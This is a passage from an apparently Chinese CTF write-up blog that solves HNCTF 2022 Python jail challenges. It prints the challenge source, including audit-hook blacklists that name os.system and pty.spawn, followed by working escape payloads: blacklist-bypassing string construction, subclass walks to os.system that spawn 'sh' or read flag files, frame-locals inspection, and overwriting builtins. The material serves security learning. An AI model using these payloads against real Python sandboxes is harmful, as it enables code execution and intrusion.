class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><br>和上题逻辑一样,第一个eval限制6个字符,不能用globals()了<br>可以使用help()函数的server查看全局变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231221184022.png" alt="image.png"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)</h3><p>考点: ==bytes()函数拼接字符串==<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                      </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                             </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>删了一些内置函数包括chr(),但是没有ban函数open,黑名单有单双引号,反引号<br>此时可以用<code>bytes([]).decode()</code>来代替chr()<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read()</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</h3><p>和上题一样的payload</p>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)</h3><p>考点: ==type()函数来拼接字符串==<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27; Good luck!</span><br></pre></td></tr></table></figure><br>这里把bytes给ban了<br>这里学到了用<code>type(str(1).encode())([i])</code>来表示ascii值为i的字节<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type(str(1).encode())([115])就是b&#x27;s&#x27;</span><br><span class="line"></span><br><span class="line">system:</span><br><span class="line">(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()</span><br><span class="line"></span><br><span class="line">(&#x27;ls&#x27;):</span><br><span class="line">((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())</span><br><span class="line"></span><br><span class="line">所以:system(&#x27;ls&#x27;)</span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>cat flag_y0u_CaNt_FiNd_mE<br>有点长,写个脚本来生产:<code>(&#39;cat flag_y0u_CaNt_FiNd_mE&#39;)</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;cat flag_y0u_CaNt_FiNd_mE&quot;</span></span><br><span class="line">str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    num=<span class="built_in">ord</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="built_in">str</span>[-<span class="number">1</span>]:</span><br><span class="line">        str1 += <span class="string">f&quot;type(str(1).encode())([<span class="subst">&#123;num&#125;</span>])&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    str1+=<span class="string">f&quot;type(str(1).encode())([<span class="subst">&#123;num&#125;</span>])+&quot;</span></span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line">res=<span class="string">&#x27;((&#x27;</span>+str1+<span class="string">&#x27;).decode())&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([99])+type(str(1).encode())([97])+type(str(1).encode())([116])+type(str(1).encode())([32])+type(str(1).encode())([102])+type(str(1).encode())([108])+type(str(1).encode())([97])+type(str(1).encode())([103])+type(str(1).encode())([95])+type(str(1).encode())([121])+type(str(1).encode())([48])+type(str(1).encode())([117])+type(str(1).encode())([95])+type(str(1).encode())([67])+type(str(1).encode())([97])+type(str(1).encode())([78])+type(str(1).encode())([116])+type(str(1).encode())([95])+type(str(1).encode())([70])+type(str(1).encode())([105])+type(str(1).encode())([78])+type(str(1).encode())([100])+type(str(1).encode())([95])+type(str(1).encode())([109])+type(str(1).encode())([69])).decode())</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231221230304.png" alt="image.png"></p>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</h3><p>考点: ==type函数配合<code>__add__</code>方法(替代加号)拼接字符串==<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure><br>这关过滤了加号,用<code>__add__</code>来替代加号<br>这里直接用参考文章师傅的脚本:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;system&quot;</span>:<span class="comment">#cat flag_y0u_CaNt_FiNd_mE</span></span><br><span class="line">    lst.append(<span class="string">f&quot;type(str(1).encode())([<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>])&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&quot;</span>+lst.pop(<span class="number">0</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;.__add__(<span class="subst">&#123;i&#125;</span>)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;).decode()&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())</span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)</h3><p>考点: ==list(dict(system=xxx))[0]来获取xxx字符串==<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure><br>这里把type给ban了,不能通过<code>type(str(1).encode())([78])</code>来获取字符,可以通过<code>list(dict(system=114514))[0]</code>来获取system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=114514))[0]](list(dict(ls=1))[0])</span><br><span class="line"></span><br><span class="line">或者直接来个sh连接</span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</h3><p>这题没ban open()函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</h3><p>考点: ==dir()函数查看变量属性==<br>这里肯定ban了open了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正常dir跟进查看</span><br><span class="line">dir()</span><br><span class="line">[&#x27;__builtins__&#x27;, &#x27;my_flag&#x27;]</span><br><span class="line">dir(my_flag)</span><br><span class="line">发现一个flag_level5</span><br><span class="line">dir(my_flag.flag_level5)</span><br><span class="line">发现一个encode方法</span><br><span class="line">my_flag.flag_level5.encode()</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-WEEK2-laKe-laKe-laKe-JAIL"><a href="#HNCTF-2022-WEEK2-laKe-laKe-laKe-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)"></a>[HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)</h3><p>考点: <code>__import__(&quot;sys&quot;).__stdout__.write</code>绕过无回显<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># You finsih these two challenge of leak</span></span><br><span class="line"><span class="comment"># So cool</span></span><br><span class="line"><span class="comment"># Now it&#x27;s time for laKe!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="comment">#这里把eval和open函数赋给新的变量,因为后面要把他们从内置变量里面删除了,但是后面还需要用到这些函数的功能</span></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]<span class="comment">#删内置函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置黑名单</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>, <span class="string">&#x27;os.spawn&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>), &#123;&#125;, &#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _  __      _       _  __      _       _  __    </span></span><br><span class="line"><span class="string"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span></span><br><span class="line"><span class="string"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span></span><br><span class="line"><span class="string"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span></span><br><span class="line"><span class="string"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(open_func(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><br>这里需要猜个很大随机数,猜对了才读flag,还把<code>sys.stdout、sys.seterr</code>重定向了，调用print无法输出,这里是通过<code>__import__(&quot;sys&quot;).__stdout__.write</code>向屏幕写入数据<br>我们读取flag文件方式有两种:</p>
<ol>
<li>os.read()函数:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231222014334.png" alt="image.png"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;os&quot;).read(__import__(&quot;os&quot;).open(&quot;./flag&quot;,__import__(&quot;os&quot;).O_RDONLY), 0x114).decode())</span><br></pre></td></tr></table></figure>
<ol>
<li>io.open()函数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&quot;io&quot;).open(&quot;test&quot;).read()类似这样可以直接读取函数</span><br><span class="line">payload:</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;io&quot;).open(&quot;flag&quot;).read())</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL"><a href="#HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)"></a>[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)</h3><p>考点: ==<code>sys._getframe()</code>方法查看全局变量==<br>这里相对于上一关就把hook多ban了几个函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>,<span class="string">&#x27;code.__new__&#x27;</span>,<span class="string">&#x27;function.__new__&#x27;</span>,<span class="string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="string">&#x27;open&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br></pre></td></tr></table></figure><br><code>__import__(&quot;sys&quot;).__stdout__.write</code>可以执行,但是open()函数ban了,无法打开文件了</p>
<p>这里需要学习一下<code>sys._getframe</code>方法,参考: <a href="https://rrroger.github.io/notebook/python/sys._getframe.html">https://rrroger.github.io/notebook/python/sys._getframe.html</a><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_func</span>():</span><br><span class="line">    caller = sys._getframe(<span class="number">1</span>)</span><br><span class="line">    file_name = caller.f_code.co_filename  <span class="comment"># 获取调用函数名所在路径</span></span><br><span class="line">    func_name = caller.f_code.co_name  <span class="comment"># 获取调用函数名</span></span><br><span class="line">    line_number = caller.f_lineno  <span class="comment"># 获取调用函数行号</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;被调用函数名路径: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;被调用函数名: <span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;被调用函数行号: <span class="subst">&#123;line_number&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cur_func = sys._getframe()</span><br><span class="line">    file_name = cur_func.f_code.co_filename  <span class="comment"># 获取调用函数名所在路径</span></span><br><span class="line">    func_name = cur_func.f_code.co_name  <span class="comment"># 获取调用函数名</span></span><br><span class="line">    line_number = cur_func.f_lineno  <span class="comment"># 获取调用函数行号; 结果为当前行</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前函数名路径: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前函数名: <span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前函数行号: <span class="subst">&#123;line_number&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caller_func</span>():</span><br><span class="line">    test_func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    caller_func()</span><br></pre></td></tr></table></figure><br>fuzz:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&quot;sys&quot;)._getframe(0)</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&quot;sys&quot;)._getframe(0).f_code.co_filename))</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&quot;sys&quot;)._getframe(0).f_lineno))</span><br><span class="line"></span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&quot;sys&quot;)._getframe(1).f_code.co_filename))</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&quot;sys&quot;)._getframe(1).f_lineno))</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&quot;sys&quot;)._getframe(1).f_code.co_name))</span><br><span class="line"></span><br><span class="line">f_locals属性查看变量:</span><br><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals))</span><br><span class="line">这里获取了right_guesser_question_answer</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231222171927.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals[&quot;right_guesser_question_answer&quot;]))</span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)</h3><p>考点: ==修改set内置函数的值==<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile</span><br><span class="line">Some code of python jail:</span><br><span class="line"></span><br><span class="line">  dict_global = dict()</span><br><span class="line">    while True:</span><br><span class="line">      try:</span><br><span class="line">          input_data = input(&quot;&gt; &quot;)</span><br><span class="line">      except EOFError:</span><br><span class="line">          print()</span><br><span class="line">          break</span><br><span class="line">      except KeyboardInterrupt:</span><br><span class="line">          print(&#x27;bye~~&#x27;)</span><br><span class="line">          continue</span><br><span class="line">      if input_data == &#x27;&#x27;:</span><br><span class="line">          continue</span><br><span class="line">      try:</span><br><span class="line">          complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)</span><br><span class="line">      except SyntaxError as err:</span><br><span class="line">          print(err)</span><br><span class="line">          continue</span><br><span class="line">      try:</span><br><span class="line">          exec(complie_code, dict_global)</span><br><span class="line">      except Exception as err:</span><br><span class="line">          print(err)</span><br></pre></td></tr></table></figure><br>参考: <a href="https://ctftime.org/writeup/28286">CTFtime.org / 圣地亚哥 CTF 2021 / HAXLAB — 残局 Pwn / Writeup</a><br>这题的白名单是通过set函数设置的,我们,而我们可以修改set这个内置函数的值为一个包含os.system的列表<br>eg<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&quot;builtins.input&quot;</span>, <span class="string">&quot;builtins.input/result&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(WHITED_EVENTS)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果:</span></span><br><span class="line">[<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span 